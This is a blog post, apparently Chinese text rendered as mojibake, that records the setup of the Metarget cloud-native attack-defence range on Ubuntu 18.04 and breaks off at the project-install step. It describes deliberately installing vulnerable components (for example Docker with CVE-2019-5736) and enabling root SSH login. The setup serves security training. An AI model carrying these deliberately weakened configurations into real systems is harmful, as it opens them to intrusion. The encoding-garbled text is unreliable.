<!-- build time:Fri Apr 01 2022 12:56:30 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="æœªå…¥æ±Ÿæ¹–ï¼Œæ€æ•¢ä½©åˆ€" href="https://www.21r000.xyz/rss.xml"><link rel="alternate" type="application/atom+xml" title="æœªå…¥æ±Ÿæ¹–ï¼Œæ€æ•¢ä½©åˆ€" href="https://www.21r000.xyz/atom.xml"><link rel="alternate" type="application/json" title="æœªå…¥æ±Ÿæ¹–ï¼Œæ€æ•¢ä½©åˆ€" href="https://www.21r000.xyz/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="SNote"><link rel="canonical" href="https://www.21r000.xyz/article/b3617362.html"><title>äº‘åŸç”Ÿæ”»é˜²é¶åœº-Metargetæ­å»ºè®°å½• - SNote | 21r000 = æœªå…¥æ±Ÿæ¹–ï¼Œæ€æ•¢ä½©åˆ€ = ä½ çš„éª‘å£«è¿˜æ²¡æœ‰æ¥ï¼Œä½ å°±æ°¸è¿œæ˜¯æˆ‘çš„å…¬ä¸»ã€‚</title><meta name="generator" content="Hexo 6.0.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">äº‘åŸç”Ÿæ”»é˜²é¶åœº-Metargetæ­å»ºè®°å½•</h1><div class="meta"><span class="item" title="åˆ›å»ºæ—¶é—´ï¼š2022-03-08 20:28:46"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">å‘è¡¨äº</span> <time itemprop="dateCreated datePublished" datetime="2022-03-08T20:28:46+08:00">2022-03-08</time> </span><span class="item" title="æœ¬æ–‡å­—æ•°"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">æœ¬æ–‡å­—æ•°</span> <span>12k</span> <span class="text">å­—</span> </span><span class="item" title="é˜…è¯»æ—¶é•¿"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">é˜…è¯»æ—¶é•¿</span> <span>11 åˆ†é’Ÿ</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="åˆ‡æ¢å¯¼èˆªæ "><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">21r000</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/6833939bly1gipeu1usa7j20zk0m8b29.jpg"></li><li class="item" data-background-image="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/8499ace0f57093639a46e7c4d9e972a.png"></li><li class="item" data-background-image="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/6833939bly1giclh0m9pdj20zk0m8hdt.jpg"></li><li class="item" data-background-image="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/6833939bly1giclh3brzpj20zk0m8ann.jpg"></li><li class="item" data-background-image="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/6833939bly1gicljitigmj20zk0m87fp.jpg"></li><li class="item" data-background-image="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/6833939bly1giciukx8a7j20zk0m8aio.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">é¦–é¡µ</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/SNote/" itemprop="item" rel="index" title="åˆ†ç±»äº SNote"><span itemprop="name">SNote</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.21r000.xyz/article/b3617362.html"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="21r000"><meta itemprop="description" content="ä½ çš„éª‘å£«è¿˜æ²¡æœ‰æ¥ï¼Œä½ å°±æ°¸è¿œæ˜¯æˆ‘çš„å…¬ä¸»ã€‚, å›ºæ€è§„åˆ™é•¿æ–¹ä½“ç©ºé—´ç§»åŠ¨å·¥ç¨‹å¸ˆ"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="æœªå…¥æ±Ÿæ¹–ï¼Œæ€æ•¢ä½©åˆ€"></span><div class="body md" itemprop="articleBody"><p>å¸ˆå‚…é—¨å¥½å¼ºå“‡ qwqï¼ï¼ï¼</p><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308203031241.png" alt="image-20220308203031241"></p><p>ç”±äº Metarget çš„æ“ä½œå¯¹è±¡å‡ä¸ºåº•å±‚åŸºç¡€è®¾æ–½ï¼Œè¯·æ‚¨æ³¨æ„ä»¥ä¸‹ä¸‰ç‚¹ï¼š</p><ol><li>è¯·å‹¿åœ¨é‡è¦æœºå™¨å’Œç”Ÿäº§ç¯å¢ƒä½¿ç”¨ã€‚</li><li>åœ¨ä½¿ç”¨å‰ï¼Œè¯·å¯¹å½“å‰ç¯å¢ƒçš„é‡è¦ä¿¡æ¯åšå¥½å¤‡ä»½ã€‚</li><li>å¦‚æœæ‰§è¡Œå¤±è´¥ï¼Œå¯æ·»åŠ  <code>â€“verbose</code> é€‰é¡¹å¹¶å†æ¬¡æ‰§è¡Œï¼ŒæŸ¥çœ‹æ˜¯å“ªé‡Œå‡ºé”™ï¼Œæ¬¢è¿æäº¤ issueã€‚åº•å±‚ç¯å¢ƒéƒ¨ç½²å¤æ‚åº¦è¾ƒé«˜ï¼Œéƒ¨ç½²å¤±è´¥æ˜¯éš¾å…çš„ï¼Œå¸Œæœ›èƒ½å¤Ÿå¾—åˆ°æ‚¨çš„æ”¯æŒï¼Œä¸€èµ·æ”¹è¿› Metargetï¼</li></ol><h2 id="è®¾è®¡ç†å¿µ"><a class="anchor" href="#è®¾è®¡ç†å¿µ">#</a> è®¾è®¡ç†å¿µ</h2><p>Metarget é¡¹ç›®çš„é¢„æœŸç›®æ ‡å¾ˆæ¸…æ™°ï¼Œä¹Ÿå¾ˆå¥½ç†è§£ï¼š</p><ol><li>å®ç°äº‘åŸç”Ÿç»„ä»¶è„†å¼±åœºæ™¯çš„è‡ªåŠ¨åŒ–æ„å»ºï¼ˆç‰¹å®šç¯å¢ƒï¼‰ã€‚</li><li>åœ¨ 1 çš„åŸºç¡€ä¸Šï¼Œå¯¹æ¥å®¹å™¨åŒ–åº”ç”¨è„†å¼±åœºæ™¯ï¼Œå®ç°äº‘åŸç”Ÿå¤šå±‚æ¬¡è„†å¼±åœºæ™¯çš„è‡ªåŠ¨åŒ–æ„å»ºï¼ˆé¶æœºï¼‰ã€‚</li><li>åœ¨ 1ã€2 çš„åŸºç¡€ä¸Šï¼Œå®ç°å¤šèŠ‚ç‚¹ + å¤šå±‚æ¬¡è„†å¼±äº‘åŸç”Ÿé›†ç¾¤çš„è‡ªåŠ¨åŒ–æ„å»ºï¼ˆé¶åœºï¼‰ã€‚</li></ol><p>å…¶ä¸­ï¼Œç›®æ ‡ 1 ä¸»è¦é¢å‘å®‰å…¨ç ”ç©¶äººå‘˜ï¼Œæ–¹ä¾¿è¿›è¡Œæ¼æ´å­¦ä¹ ã€è°ƒè¯•ï¼Œç‰¹å®š PoCã€ExP çš„ç¼–å†™å’Œæµ‹è¯•ï¼›ç›®æ ‡ 2 å’Œ 3 ä¸»è¦é¢å‘æƒ³è¦ç£¨ç»ƒäº‘åŸç”Ÿå®‰å…¨æ”»é˜²å®æˆ˜æŠ€èƒ½çš„çº¢è“å¯¹æŠ—ã€æ¸—é€æµ‹è¯•äººå‘˜ã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œäº‘åŸç”Ÿå®‰å…¨äº§å“å¼€å‘çš„åŒå­¦ä¹Ÿå¯ä»¥å€ŸåŠ© Metarget é¡¹ç›®éƒ¨ç½²è„†å¼±ç¯å¢ƒï¼Œæµ‹è¯•é˜²å¾¡ç³»ç»Ÿçš„å¨èƒæ£€æµ‹èƒ½åŠ›å’Œå“åº”èƒ½åŠ›ã€‚</p><p>è¯·æ³¨æ„ï¼Œè™½ç„¶åœ¨è‹±æ–‡ä¸­ï¼Œè„†å¼±æ€§å’Œæ¼æ´æ˜¯åŒä¸€ä¸ªè¯ï¼ˆVulnerabilityï¼‰ï¼Œä½†æ˜¯ç»“åˆå®‰å…¨é¢†åŸŸçš„å®é™…æƒ…å†µæ¥çœ‹ï¼Œæœ‰çš„è„†å¼±åœºæ™¯è¢«åˆ†é…äº† CVE ç¼–å·ï¼›æœ‰çš„è™½ç„¶æ²¡æœ‰ CVE ç¼–å·ï¼Œä½†æ˜¯åˆ†é…äº†å‚å•†è‡ªå·±çš„ç¼–å·ï¼›æœ‰çš„è„†å¼±åœºæ™¯å´ç”±äºå„ç§åŸå› å¹¶æ²¡æœ‰ç»Ÿä¸€çš„å‘½åã€‚è¿™äº›æƒ…å†µéƒ½å¾ˆå¸¸è§ã€‚ <code>Metarget</code> ä¸ä»…å…³æ³¨ç‹­ä¹‰ä¸Šçš„æ¼æ´ï¼Œè€Œæ˜¯å¸Œæœ›åœ¨é€‚ç”¨åœºæ™¯èŒƒå›´å†…ï¼Œå®ç°å¯¹ä¸Šè¿°å„ç§æƒ…å†µçš„è„†å¼±åœºæ™¯çš„è‡ªåŠ¨åŒ–æ„å»ºã€‚</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä¼šè°ˆä¸€è°ˆ <code>Metarget</code> é¡¹ç›®çš„ä¸¤ä¸ªæ ¸å¿ƒç†å¿µï¼Œç„¶åå‘å¤§å®¶ä»‹ç» <code>Metarget</code> çš„åŸºæœ¬ä½¿ç”¨æ–¹æ³•å’Œç›®å‰æ”¯æŒçš„è„†å¼±åœºæ™¯ã€‚</p><ul><li><strong>â€œå®‰è£…æ¼æ´â€</strong></li></ul><p>åœ¨ <code>Metarget</code> é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬æå‡º â€œå®‰è£…æ¼æ´â€ã€â€œå®‰è£…è„†å¼±åœºæ™¯â€ çš„æ¦‚å¿µã€‚æ¼æ´ä¸ºä»€ä¹ˆä¸èƒ½åƒè½¯ä»¶ä¸€æ ·ç›´æ¥å®‰è£…å‘¢ï¼Ÿç¨‹åºä¸ºå®ï¼Œæ¼æ´ä¸ºè™šï¼›è½¯ä»¶ä¸ºæ»¡ï¼Œæ¼æ´ä¸ºç¼ºã€‚é‚£ä¹ˆåªéœ€æ¢ä¸€ç§è§†è§’ï¼Œè§†è™šä¸ºå®ï¼Œä»¥ç¼ºä¸ºæ»¡ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥åƒå®‰è£…è½¯ä»¶ä¸€æ ·å®‰è£…æ¼æ´ â€”â€” ä»¥å®‰å…¨ç ”ç©¶ã€æ”»é˜²å®æˆ˜ä¸ºç›®çš„ã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œæˆ‘ä»¬å¸Œæœ›æ‰§è¡Œç±»ä¼¼ <code>metarget cnv install cve-2019-5736</code> çš„å‘½ä»¤ï¼Œç›´æ¥å°†å¸¦æœ‰ <code>CVE-2019-5736</code> æ¼æ´çš„ <code>Docker</code> å®‰è£…åœ¨æœåŠ¡å™¨ä¸Šã€‚</p><p>æœ‰å®‰è£…ï¼Œå°±æœ‰å¸è½½ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œæˆ‘ä»¬å¸Œæœ›é€šè¿‡æ‰§è¡Œç±»ä¼¼ <code>metarget cnv remove cve-2019-5736</code> çš„å‘½ä»¤å°†æ¼æ´ç»„ä»¶ä»ç³»ç»Ÿç§»é™¤ã€‚</p><ul><li><strong>å¤æ‚è„†å¼±åœºæ™¯</strong></li></ul><p>ä»…ä»…åšå•ä¸ªè„†å¼±åœºæ™¯çš„è‡ªåŠ¨åŒ–æ„å»ºï¼Œåƒæ»šé›ªçƒä¸€æ ·ï¼Œéšç€äº‘åŸç”ŸæŠ€æœ¯çš„å‘å±•ã€å®‰å…¨ç ”ç©¶çš„æ¨è¿›ï¼Œä¸æ–­æ”¶é›†è„†å¼±åœºæ™¯ï¼Œäº¦æ— ä¸å¯ã€‚ç„¶è€Œï¼Œ <code>Metarget</code> è¿˜åº”è¯¥èƒ½åšçš„æ›´å¤šï¼Œå°¤å…¶æ˜¯åœ¨äº‘åŸç”ŸæŠ€æœ¯çš„åŠ æŒä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ›å®ƒèƒ½å¤Ÿå®ç°å¤šèŠ‚ç‚¹ã€å¤šå±‚æ¬¡çš„å¤æ‚è„†å¼±åœºæ™¯æ„å»ºã€‚</p><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä»æ”»å‡»è€…çš„è§†è§’æ¥çœ‹ï¼Œè¾¹ç•Œçªç ´ã€æ‰©å¤§æˆ˜æœã€è®¿é—®æŒä¹…åŒ–ï¼Œæ¯ä¸€ä¸ªæ­¥éª¤éƒ½æ¶‰åŠè®¸å¤šä¸åŒçš„æŠ€æœ¯æ‰‹æ®µã€æ¼æ´åˆ©ç”¨æ‰‹æ³•ã€‚å¦‚æœèƒ½å¤Ÿä»¥äº‘åŸç”Ÿé›†ç¾¤ä¸ºä¾æ‰˜ï¼Œå°†è¿™äº›æŠ€è‰ºçš„åº”ç”¨åœºæ™¯ç»„åˆèµ·æ¥ï¼Œå°±èƒ½å¤Ÿå‘ˆç°æ›´æœ‰æ„æ€çš„æ”»é˜²åœºæ™¯ï¼Œç£¨ç»ƒå‡ºæ›´åŠ å¼ºå¤§çš„æ”»é˜²æœ¬é¢†ã€‚æ”»é˜²ç›¸ç ºï¼Œæ•…ä»é˜²å®ˆè€…è§†è§’æ¥çœ‹ä¹Ÿæ˜¯å¦‚æ­¤ã€‚</p><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/1-3-1024x489.png" alt="img"></p><p>ä¹Ÿæ­£æ˜¯ä»è¿™ä¸€ç‚¹ï¼ˆåŸºäºäº‘åŸç”ŸæŠ€æœ¯åˆ¶ä½œå¤æ‚åœºæ™¯ï¼‰å‡ºå‘ï¼Œæˆ‘ä»¬å°† <code>Metarget</code> å®šä½åœ¨äº‘åŸç”Ÿæ”»é˜²é¶åœºã€‚è¿™æ˜¯å®ƒçš„ç‹¬ç‰¹æ„ä¹‰æ‰€åœ¨ã€‚</p><h2 id="å®‰è£…æ•™ç¨‹"><a class="anchor" href="#å®‰è£…æ•™ç¨‹">#</a> å®‰è£…æ•™ç¨‹</h2><p><code>Metarget</code> ç›®å‰ä»…æ”¯æŒåœ¨ <code>Ubuntu 16.04</code> å’Œ <code>18.04</code> å®‰è£…è¿è¡Œï¼Œåœ¨ <code>20.04</code> ä¸Šå¯èƒ½ä¼šé‡åˆ°ä¾èµ–é¡¹é—®é¢˜ã€‚å®‰è£…æ­¥éª¤ååˆ†ç®€å•ã€‚<br>è¿™é‡Œä½¿ç”¨çš„æ˜¯ä¸€å°çº¯å‡€çš„ <code>Ubuntu 18.04</code> ä¸ºä¾‹è¿›è¡Œå®‰è£…ï¼š</p><h3 id="å¼€å¯ubuntu1804å¼€å¯rootè¿œç¨‹ç™»å½•"><a class="anchor" href="#å¼€å¯ubuntu1804å¼€å¯rootè¿œç¨‹ç™»å½•">#</a> å¼€å¯ Ubuntu18.04 å¼€å¯ root è¿œç¨‹ç™»å½•</h3><p>ä¹ æƒ¯äºåœ¨ FinalShell æˆ– XShell ä¸Šè¿›è¡Œæ“ä½œçš„å¼€å¯è¿œç¨‹ç™»å½•ï¼Œä¸å¼€å°±ç›´æ¥åœ¨æ§åˆ¶å°ä¸Šè¿›è¡Œä¹Ÿè¡Œã€‚</p><ol><li>æ¡Œé¢ä¸Šå³é”®æ‰“å¼€ç»ˆç«¯ï¼Œé€šè¿‡ <code>su -</code> è·å– <code>rootæƒé™</code> ï¼Œæˆ–è€…é€šè¿‡ <code>sudo</code> æå‡æƒé™ï¼Œé”®å…¥å¦‚ä¸‹å‘½ä»¤ï¼š</li></ol><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">apt-get</span> <span class="token function">install</span> openssh-server</pre></td></tr></table></figure><p>æŒ‰ <code>y</code> åŒæ„æ‰§è¡Œå³å¯ã€‚</p><ol start="2"><li>å¼€å¯ root ç”¨æˆ·è¿œç¨‹ç™»å½•ï¼ˆæŒ‰ä¸ªäººè¦æ±‚å¼€å¯ï¼‰</li></ol><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">vim</span> /etc/ssh/sshd_config</pre></td></tr></table></figure><p>æ‰“å¼€ 22 ç«¯å£</p><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308144339446.png" alt="image-20220308144339446"></p><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308143757488.png" alt="image-20220308143757488"></p><p>å°† <code>PermitRootLogin</code> ä¿®æ”¹ä¸º <code>yes</code> ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><ol start="3"><li>å¯åŠ¨ SSH æœåŠ¡</li></ol><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>/etc/init.d/ssh start</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308143910088.png" alt="image-20220308143910088"></p><ol start="4"><li>æŸ¥çœ‹ SSH æ˜¯å¦å¯åŠ¨æˆåŠŸ</li></ol><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">ps</span> -e <span class="token operator">|</span> <span class="token function">grep</span> sshd</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308143944550.png" alt="image-20220308143944550"></p><ol start="5"><li>å…³é—­ SSH æœåŠ¡</li></ol><pre><code>/etc/init.d/ssh stop
</code></pre><ol start="6"><li>è¿œç¨‹ç™»å½•</li></ol><p>ifconfig æŸ¥çœ‹æœ¬æœº IP</p><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308144051045.png" alt="image-20220308144051045"></p><p>è¿›è¡Œè¿œç¨‹ root ç™»å½•</p><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308144219240.png" alt="image-20220308144219240"></p><p>æˆåŠŸç™»å½•</p><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308144733598.png" alt="image-20220308144733598"></p><h3 id="ç»™ubuntu1804æ›´æ¢å›½å†…æº"><a class="anchor" href="#ç»™ubuntu1804æ›´æ¢å›½å†…æº">#</a> ç»™ Ubuntu18.04 æ›´æ¢å›½å†…æº</h3><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># é¦–å…ˆå¤‡ä»½æºåˆ—è¡¨</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> <span class="token function">cp</span> /etc/apt/sources.list /etc/apt/sources.list_backup</pre></td></tr></table></figure><p>æ‰“å¼€ <code>/etc/apt/sources.list</code></p><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># æ‰“å¼€ sources.list æ–‡ä»¶</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> gedit /etc/apt/sources.list</pre></td></tr></table></figure><p>ç¼–è¾‘ **/etc/apt/sources.list** æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶æœ€å‰é¢æ·»åŠ é˜¿é‡Œäº‘é•œåƒæºï¼š</p><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#  é˜¿é‡Œæº</span></pre></td></tr><tr><td data-num="2"></td><td><pre>deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</pre></td></tr><tr><td data-num="3"></td><td><pre>deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</pre></td></tr><tr><td data-num="4"></td><td><pre>deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</pre></td></tr><tr><td data-num="5"></td><td><pre>deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</pre></td></tr><tr><td data-num="6"></td><td><pre>deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</pre></td></tr><tr><td data-num="7"></td><td><pre>deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</pre></td></tr><tr><td data-num="8"></td><td><pre>deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</pre></td></tr><tr><td data-num="9"></td><td><pre>deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</pre></td></tr><tr><td data-num="10"></td><td><pre>deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</pre></td></tr><tr><td data-num="11"></td><td><pre>deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">#  ä¸­ç§‘å¤§æº</span></pre></td></tr><tr><td data-num="14"></td><td><pre>deb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse</pre></td></tr><tr><td data-num="15"></td><td><pre>deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse</pre></td></tr><tr><td data-num="16"></td><td><pre>deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</pre></td></tr><tr><td data-num="17"></td><td><pre>deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</pre></td></tr><tr><td data-num="18"></td><td><pre>deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</pre></td></tr><tr><td data-num="19"></td><td><pre>deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</pre></td></tr><tr><td data-num="20"></td><td><pre>deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</pre></td></tr><tr><td data-num="21"></td><td><pre>deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</pre></td></tr><tr><td data-num="22"></td><td><pre>deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</pre></td></tr><tr><td data-num="23"></td><td><pre>deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token comment"># 163 æº</span></pre></td></tr><tr><td data-num="26"></td><td><pre>deb http://mirrors.163.com/ubuntu/ bionic main restricted universe multiverse</pre></td></tr><tr><td data-num="27"></td><td><pre>deb http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiverse</pre></td></tr><tr><td data-num="28"></td><td><pre>deb http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiverse</pre></td></tr><tr><td data-num="29"></td><td><pre>deb http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiverse</pre></td></tr><tr><td data-num="30"></td><td><pre>deb http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiverse</pre></td></tr><tr><td data-num="31"></td><td><pre>deb-src http://mirrors.163.com/ubuntu/ bionic main restricted universe multiverse</pre></td></tr><tr><td data-num="32"></td><td><pre>deb-src http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiverse</pre></td></tr><tr><td data-num="33"></td><td><pre>deb-src http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiverse</pre></td></tr><tr><td data-num="34"></td><td><pre>deb-src http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiverse</pre></td></tr><tr><td data-num="35"></td><td><pre>deb-src http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiverse</pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token comment"># æ¸…åæº</span></pre></td></tr><tr><td data-num="38"></td><td><pre>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</pre></td></tr><tr><td data-num="39"></td><td><pre>deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</pre></td></tr><tr><td data-num="40"></td><td><pre>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</pre></td></tr><tr><td data-num="41"></td><td><pre>deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</pre></td></tr><tr><td data-num="42"></td><td><pre>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</pre></td></tr><tr><td data-num="43"></td><td><pre>deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</pre></td></tr><tr><td data-num="44"></td><td><pre>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</pre></td></tr><tr><td data-num="45"></td><td><pre>deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</pre></td></tr><tr><td data-num="46"></td><td><pre>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</pre></td></tr><tr><td data-num="47"></td><td><pre>deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308145227545.png" alt="image-20220308145227545"></p><p>åˆ·æ–°åˆ—è¡¨</p><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> update</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> upgrade</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> build-essential</pre></td></tr></table></figure><h3 id="å®‰è£…docker"><a class="anchor" href="#å®‰è£…docker">#</a> å®‰è£… docker</h3><p>ä¹Ÿå¯ä¸æ‰§è¡Œæ­¤é¡¹æ“ä½œï¼Œmetarget é¡¹ç›®é›†æˆç¯å¢ƒä¼šåœ¨æ‰§è¡Œå‘½ä»¤æ—¶è‡ªåŠ¨å®‰è£… dockerï¼</p><p>è¾“å…¥ docker æ£€æµ‹æ˜¯å¦å®‰è£… docker</p><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308135713911.png" alt="image-20220308135713911"></p><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> snap <span class="token function">install</span> <span class="token function">docker</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#æ®è¯´ apt install docker.io å®‰è£…çš„ç‰ˆæœ¬ä¼šæ¯”è¾ƒæ—§ï¼Œæœæ–­é€‰æ‹© sudo snap install docker å®‰è£…</span></pre></td></tr></table></figure><p>è¾“å…¥ docker æ˜¾ç¤º</p><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308135934079.png" alt="image-20220308135934079"></p><h3 id="å®‰è£…é¡¹ç›®"><a class="anchor" 